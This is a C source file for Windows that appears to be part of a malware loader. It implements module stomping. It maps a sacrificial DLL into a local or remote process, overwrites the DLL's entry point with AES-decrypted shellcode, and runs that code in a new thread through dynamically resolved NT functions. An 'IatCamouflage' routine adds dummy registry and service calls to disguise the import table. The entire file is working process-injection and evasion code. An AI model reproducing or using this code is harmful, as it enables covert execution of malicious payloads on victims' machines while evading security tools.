#include <windows.h>
#include <Common.h>
#include "Macros.h"
#include "Aes.h"


VOID IatCamouflage() {

	ULONG_PTR		uAddress	= NULL;

	if (!(uAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100)))
		return;

	if (((uAddress >> 8) & 0xFF) > 0xFFFF) {
		RegCloseKey(NULL);
		RegDeleteKeyExA(NULL, NULL, NULL, NULL);
		RegDeleteKeyExW(NULL, NULL, NULL, NULL);
		RegEnumKeyExA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegEnumKeyExW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegEnumValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegEnumValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegGetValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegGetValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegisterServiceCtrlHandlerA(NULL, NULL);
		RegisterServiceCtrlHandlerW(NULL, NULL);
	}

	if (!HeapFree(GetProcessHeap(), 0x00, uAddress))
		return;
}



BOOL InstallAesDecryptionViaCtAes(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv, OUT PBYTE* ppPlainTextBuffer) {

	AES256_CBC_ctx	AesCtx = { 0x00 };

	if (!pCipherTextBuffer || !sCipherTextSize || !ppPlainTextBuffer || !pAesKey || !pAesIv)
		return FALSE;

	if (!(*ppPlainTextBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sCipherTextSize))) {
		PRINTA("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	RtlSecureZeroMemory(&AesCtx, sizeof(AES256_CBC_ctx));
	AES256_CBC_init(&AesCtx, pAesKey, pAesIv);
	AES256_CBC_decrypt(&AesCtx, (sCipherTextSize / 16), *ppPlainTextBuffer, pCipherTextBuffer);

	return TRUE;
}

BOOL InitializeSyscallsStruct() {

	HMODULE		hNtdll = NULL;

	if (!(hNtdll = GetModuleHandle(TEXT("NTDLL")))) {
		PRINTA("[!] GetModuleHandle Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	g_NtApi.pNtCreateFile			= (fnNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
	g_NtApi.pNtCreateSection		= (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	g_NtApi.pNtMapViewOfSection		= (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	g_NtApi.pNtUnmapViewOfSection	= (fnNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
	g_NtApi.pNtCreateThreadEx		= (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
	g_NtApi.pNtProtectVirtualMemory	= (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	g_NtApi.pNtWriteVirtualMemory	= (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");

	if (!g_NtApi.pNtCreateFile			|| !g_NtApi.pNtCreateSection	|| !g_NtApi.pNtMapViewOfSection		||
		!g_NtApi.pNtUnmapViewOfSection	|| !g_NtApi.pNtCreateThreadEx	|| !g_NtApi.pNtWriteVirtualMemory	|| !g_NtApi.pNtProtectVirtualMemory)
	{
		return FALSE;
	}

	return TRUE;
}

BOOL StompModule(IN HANDLE hProcess, IN LPWSTR szSacrificialDllPath, IN PBYTE pShellcodeBuffer, IN SIZE_T sShellcodeLength, OUT PHANDLE phThread) {

	NTSTATUS				STATUS						= STATUS_SUCCESS;
	HANDLE					hFile						= NULL,
							hSection					= NULL;
	WCHAR					szNtPathDll[MAX_PATH]		= { 0 };
	OBJECT_ATTRIBUTES		ObjAttributes				= { 0 };
	UNICODE_STRING			UnicodeStr					= { 0 };
	IO_STATUS_BLOCK			IOStatusBlock				= { 0 };
	SIZE_T					sViewSize					= NULL,
							sTextSectionSize			= NULL,
							sTextSizeLeft				= NULL,
							sTmpSizeVar					= sShellcodeLength,
							sNmbrOfBytesWritten			= NULL;
	ULONG_PTR				uLocalMappedAdd				= NULL,
							uRemoteMappedAdd			= NULL,
							uLocalEntryPntAdd			= NULL,
							uRemoteEntryPntAdd			= NULL,
							uTextSectionAddress			= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs					= NULL;
	PIMAGE_SECTION_HEADER	pImgSecHdr					= NULL;
	DWORD					dwOldProtection				= 0x00;
	BOOL					bRemoteInjection			= hProcess == NtCurrentProcess() ? FALSE : TRUE;

	if (!hProcess || !szSacrificialDllPath || !pShellcodeBuffer || !sShellcodeLength || !phThread)
		return FALSE;

	if (!InitializeSyscallsStruct()){
		PRINTA("[!] Failed tp initialise struct\n");
		return FALSE;
	}

	wsprintfW(szNtPathDll, L"\\??\\\\%s", szSacrificialDllPath);
	RtlInitUnicodeString(&UnicodeStr, szNtPathDll);
	InitializeObjectAttributes(&ObjAttributes, &UnicodeStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	// PRINTA("[+] NtCreateFile => 0x%p\n", g_NtApi.pNtCreateFile);
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateFile(&hFile, FILE_GENERIC_READ, &ObjAttributes, &IOStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_RANDOM_ACCESS, NULL, 0x00))) || !hFile) {
		PRINTA("[!] NtCreateFile Failed With Error: %d %d \n", STATUS, GetLastError());
		return FALSE;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hFile)))) {
		PRINTA("[!] NtCreateSection Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	PRINTA("[i] Mapping The Sacrificial DLL Into Local Process For PE Parsing ...");

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtMapViewOfSection(hSection, NtCurrentProcess(), &uLocalMappedAdd, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, bRemoteInjection ? PAGE_READONLY : PAGE_EXECUTE_READWRITE)))) {
		PRINTA("[!] NtMapViewOfSection [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	PRINTA("[+] DONE \n");
	PRINTA("[*] Mapped At: 0x%p \n", uLocalMappedAdd);

	if (!bRemoteInjection) {

		PRINTA("[i] Using The Same Map View For Module Stomping (Local Injection) \n");
	}

	else {
		PRINTA("[i] Mapping The Sacrificial DLL Into Remote Process ...");
		if (!NT_SUCCESS((STATUS = g_NtApi.pNtMapViewOfSection(hSection, hProcess, &uRemoteMappedAdd, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE)))) {
			PRINTA("[!] NtMapViewOfSection [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
			goto _END_OF_FUNC;
		}
		PRINTA("[+] DONE \n");
		PRINTA("[*] Mapped At: 0x%p \n", uRemoteMappedAdd);
	}

	// Fetch Nt Headers
	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uLocalMappedAdd + ((PIMAGE_DOS_HEADER)uLocalMappedAdd)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	// Fetch Entry Point
	uLocalEntryPntAdd	= uLocalMappedAdd + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
	uRemoteEntryPntAdd	= uRemoteMappedAdd + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;


	// Fetch Section Header
	pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		if ((*(ULONG*)pImgSecHdr[i].Name | 0x20202020) == 'xet.') {
			uTextSectionAddress		= uLocalMappedAdd + pImgSecHdr[i].VirtualAddress;
			sTextSectionSize		= pImgSecHdr[i].Misc.VirtualSize;
			break;
		}
	}

	if (!uTextSectionAddress || !sTextSectionSize)
		goto _END_OF_FUNC;

	// Calculate the size between the entry point and the end of the text section.
	sTextSizeLeft = sTextSectionSize - (uLocalEntryPntAdd - uTextSectionAddress);

	PRINTA("[i] Payload Size: %d Byte\n", sShellcodeLength);
	PRINTA("[i] Available Memory (Starting From The EP): %d Byte\n", sTextSizeLeft);

	if (sShellcodeLength > sTextSizeLeft) {
		PRINTA("[!] Shellcode Is Too Big For The Available Memory! \n");
		goto _END_OF_FUNC;
	}

	if (bRemoteInjection) {
		PRINTA("[i] Unmapping Local View (Remote Injection) ...");
		if (!NT_SUCCESS((STATUS = g_NtApi.pNtUnmapViewOfSection(NtCurrentProcess(), uLocalMappedAdd)))) {
			PRINTA("[!] NtUnmapViewOfSection Failed With Error: 0x%0.8X \n", STATUS);
			goto _END_OF_FUNC;
		}
		uLocalMappedAdd = NULL;
		PRINTA("[+] DONE \n");
	}

	PRINTA("[i] Injecting Payload At 0x%p - (%s)\n", bRemoteInjection ? uRemoteEntryPntAdd : uLocalEntryPntAdd, bRemoteInjection ? "Remote Entry Point" : "Local Entry Point");

	PRINTA("[i] Writing Payload ...");
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(hProcess, bRemoteInjection ? &uRemoteEntryPntAdd : &uLocalEntryPntAdd, &sTmpSizeVar, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		PRINTA("[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, bRemoteInjection ? uRemoteEntryPntAdd : uLocalEntryPntAdd, pShellcodeBuffer, sShellcodeLength, &sNmbrOfBytesWritten))) || sNmbrOfBytesWritten != sShellcodeLength) {
		PRINTA("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		PRINTA("[i] Wrote %d Of %d Bytes \n", sNmbrOfBytesWritten, sShellcodeLength);
		goto _END_OF_FUNC;
	}
	PRINTA("[+] DONE \n");

	PRINTA("[i] Executing Payload ...");
	if (!NT_SUCCESS(g_NtApi.pNtCreateThreadEx(phThread, THREAD_ALL_ACCESS, NULL, hProcess, bRemoteInjection ? uRemoteEntryPntAdd : uLocalEntryPntAdd, NULL, 0x00, 0x00, 0x00, 0x00, NULL))) {
		PRINTA("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}
	PRINTA("[+] DONE \n");
	PRINTA("[*] Payload Executed With Thread Of ID: %d \n", GetThreadId(*phThread));

_END_OF_FUNC:
	DELETE_HANDLE(hFile);
	DELETE_HANDLE(hSection);
	if (bRemoteInjection && uLocalMappedAdd)
		g_NtApi.pNtUnmapViewOfSection(NtCurrentProcess(), uLocalMappedAdd);
	return *phThread ? TRUE : FALSE;
}